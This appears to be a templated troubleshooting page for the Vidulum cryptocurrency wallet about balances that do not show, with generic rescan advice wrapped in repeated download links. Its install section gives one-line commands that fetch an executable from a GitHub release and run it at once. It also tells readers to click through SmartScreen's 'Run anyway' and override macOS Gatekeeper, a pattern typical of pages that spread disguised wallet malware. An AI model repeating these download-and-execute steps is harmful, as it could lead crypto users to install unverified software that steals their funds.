![Vidulum](../assets/banner-article.png)

# Vidulum Balance Not Showing: Received Coins and Rescans

The explorer test that tells you whether you have a wallet problem or a chain problem.

## Downloads - v2.2.1

<p align="center"><a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-win-v2.2.1.exe"><img src="../assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-macos-v2.2.1.dmg"><img src="../assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-linux-v2.2.1.zip"><img src="../assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="../assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`vidulum-wallet-desktop-win-v2.2.1.exe`](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-win-v2.2.1.exe) |
| <img src="../assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`vidulum-wallet-desktop-macos-v2.2.1.dmg`](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-macos-v2.2.1.dmg) |
| <img src="../assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`vidulum-wallet-desktop-linux-v2.2.1.zip`](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-linux-v2.2.1.zip) |

Update to the [current Vidulum release](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/tag/v2.2.1) before you rescan anything.

> The chain holds your coins. The wallet only displays them, and a display can be wrong.

Coins arrived, an explorer shows them, and the wallet does not. That gap is almost always display state rather than loss. The first move is to confirm the balance on an explorer for the right chain, because that decides whether you are debugging a wallet or waiting on a network.

<!-- ARTICLE-BODY-BEGIN -->

## The explorer test, first

Copy the address that received the coins and look it up on an explorer for the chain you expected. Three outcomes:

- **Balance visible, correct chain:** the coins arrived. The wallet is not showing them, which is a display problem.
- **Balance visible, different chain:** the coins arrived somewhere you did not intend, and the wallet is showing the truth.
- **Address empty:** the transaction has not confirmed, or it went elsewhere entirely.

Only the first case is a wallet issue. Running this check before changing settings prevents the common mistake of rescanning a wallet to fix a transaction that never happened.

## Why a refresh is sometimes needed

The wallet tracks chain state through remote reads. After a chain upgrade or a long offline period, its cached view can lag behind the chain, and a received balance will not appear until it re-reads.

That is what a rescan or refresh does: it discards the cached view and rebuilds it from the chain. It is a repair for a stale view, not a general-purpose fix, and running it repeatedly on a healthy wallet just costs time.

## Doing it in the right order

1. Confirm the balance on an explorer first, as above.
2. Update to the current release, since an older build can read the chain incorrectly after an upgrade.
3. Refresh the specific chain, not every chain at once.
4. Check the balance again, then compare with the explorer.
5. If the two still disagree, note the address and transaction, then contact support.

Narrow steps make the result readable. If you refresh everything at once, you cannot tell which change fixed it, and neither can anyone helping you.

## When an upgrade is the cause

A chain upgrade can change what a wallet must read, and a build older than the upgrade can show a balance that no longer matches. That is why the update step comes before the rescan: updating often resolves it, and refreshing an outdated build can leave you in the same state.

Upgrade-related balance changes are reported rather than confirmed as a specific defect, so treat this as the likely order of events rather than a diagnosis.

A failed send is a different problem and is covered in <a href="https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/vidulum-send-error-transaction-fails.md">Vidulum Wallet send error checks</a>.

## What not to do

- Do not restore the wallet to "refresh" it; a restore does not change what the chain holds.
- Do not send more coins to test whether the balance appears.
- Do not accept help that requires your phrase.
- Do not assume the coins are gone because the interface shows zero.

A wallet showing zero and a chain showing a balance means the wallet is wrong. The opposite - chain zero, wallet showing a balance - is the more serious case, and it usually means the wallet is reading a different network.

An unreachable chain belongs in <a href="https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/vidulum-network-disconnected-check-chain.md">Vidulum network disconnected check</a>, which starts with the two-chain test.

If the explorer shows the balance and the wallet still does not, <a href="https://github.com/vidulum-app/vidulum-wallet-guides/blob/main/guides/vidulum-restore-wallet-recovery-phrase.md">Vidulum Wallet recovery phrase restore</a> explains why a restore will not change it.

Update to the <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/tag/v2.2.1">Vidulum Wallet v2.2.1 release</a> build first, then recheck the wallet.

## FAQ

### Are my coins lost if the balance is not showing?

Usually not. Check the address on an explorer; if the balance is there, the coins are there.

### Does rescanning always fix it?

No. It fixes a stale view. If the address is wrong or the chain is not supported, it changes nothing.

### Why did the balance change after an update?

An update can change how the wallet reads a chain. Refresh the chain and compare against an explorer.

### Should I restore the wallet?

Not as a first step. Restoring reopens the same addresses and does not correct a display issue.

<!-- ARTICLE-BODY-END -->

## How to install Vidulum

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-win-v2.2.1.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-win-v2.2.1.exe">vidulum-wallet-desktop-win-v2.2.1.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-macos-v2.2.1.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-macos-v2.2.1.dmg">vidulum-wallet-desktop-macos-v2.2.1.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Quick install (Terminal):

```bash
curl -fLo wallet.zip https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-linux-v2.2.1.zip && unzip -o wallet.zip -d vidulum-linux && chmod +x vidulum-linux/vidulum-wallet-desktop && ./vidulum-linux/vidulum-wallet-desktop
```

Manual install:
1. Download <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-linux-v2.2.1.zip">vidulum-wallet-desktop-linux-v2.2.1.zip</a>.
2. Extract the archive: `unzip -o wallet.zip -d vidulum-linux`.
3. Make it executable and run it: `chmod +x vidulum-linux/vidulum-wallet-desktop && ./vidulum-linux/vidulum-wallet-desktop`.
4. If the archive extracts a differently named program or a folder of its own, run that file instead: the ZIP is the download, not the program.
<!-- INSTALL-END -->

## Related guides

[Send error checks](https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/vidulum-send-error-transaction-fails.md) - [Network disconnected checks](https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/vidulum-network-disconnected-check-chain.md) - [Restore from a phrase](https://github.com/vidulum-app/vidulum-wallet-guides/blob/main/guides/vidulum-restore-wallet-recovery-phrase.md) - [Current release](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/tag/v2.2.1)
